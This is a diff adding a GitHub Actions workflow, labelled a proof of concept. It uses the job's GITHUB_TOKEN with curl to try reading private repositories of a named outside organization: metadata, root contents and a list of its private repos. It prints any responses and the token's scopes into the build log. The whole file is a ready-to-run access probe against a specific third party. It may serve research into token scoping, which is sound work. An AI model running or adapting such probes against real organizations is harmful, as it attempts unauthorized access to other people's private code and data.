@@ -1,0 +1,79 @@
+# PoC: Test whether GITHUB_TOKEN can read private repos cross-org
+# Dispatched manually to avoid needing a new PR.
+
+name: "PoC: Cross-Repo Token Probe"
+
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    steps:
+      - name: "[probe] GITHUB_TOKEN cross-repo access"
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          echo "=== GITHUB_TOKEN cross-repo access probe ==="
+          echo "Token issued for: ${{ github.repository }}"
+          echo ""
+
+          echo "--- Same-owner public repo ---"
+          curl -s -o /dev/null -w "HTTP %{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/zgong-motive/yolov5" && echo
+
+          echo "--- KeepTruckin/k2web (private, SAML org) ---"
+          RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/KeepTruckin/k2web")
+          echo "$RESP" | tail -1
+          echo "$RESP" | head -5
+
+          echo ""
+          echo "--- KeepTruckin/sdk-sidewalk (parent, SAML org) ---"
+          RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/KeepTruckin/sdk-sidewalk")
+          echo "$RESP" | tail -1
+          echo "$RESP" | head -5
+
+          echo ""
+          echo "--- nrfconnect/sdk-sidewalk (public, upstream source) ---"
+          curl -s -o /dev/null -w "HTTP %{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/nrfconnect/sdk-sidewalk" && echo
+
+          echo ""
+          echo "--- nrfconnect/sdk-nrf (public, same org) ---"
+          curl -s -o /dev/null -w "HTTP %{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/nrfconnect/sdk-nrf" && echo
+
+          echo ""
+          echo "--- ultralytics/yolov5 (public, unrelated) ---"
+          curl -s -o /dev/null -w "HTTP %{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/ultralytics/yolov5" && echo
+
+          echo ""
+          echo "--- KeepTruckin/k2web contents (if accessible) ---"
+          RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/KeepTruckin/k2web/contents/")
+          echo "$RESP" | tail -1
+          echo "$RESP" | head -10
+
+          echo ""
+          echo "--- List KeepTruckin org repos (would reveal private repos) ---"
+          RESP=$(curl -s -w "\nHTTP_CODE:%{http_code}" \
+            -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/orgs/KeepTruckin/repos?type=private&per_page=3")
+          echo "$RESP" | tail -1
+          echo "$RESP" | head -5
+
+          echo ""
+          echo "=== Token metadata (X-OAuth-Scopes) ==="
+          curl -s -I -H "Authorization: token $GH_TOKEN" \
+            "https://api.github.com/repos/${{ github.repository }}" 2>/dev/null | \
+            grep -iE 'x-oauth-scopes|x-accepted-oauth-scopes|x-github-media-type'
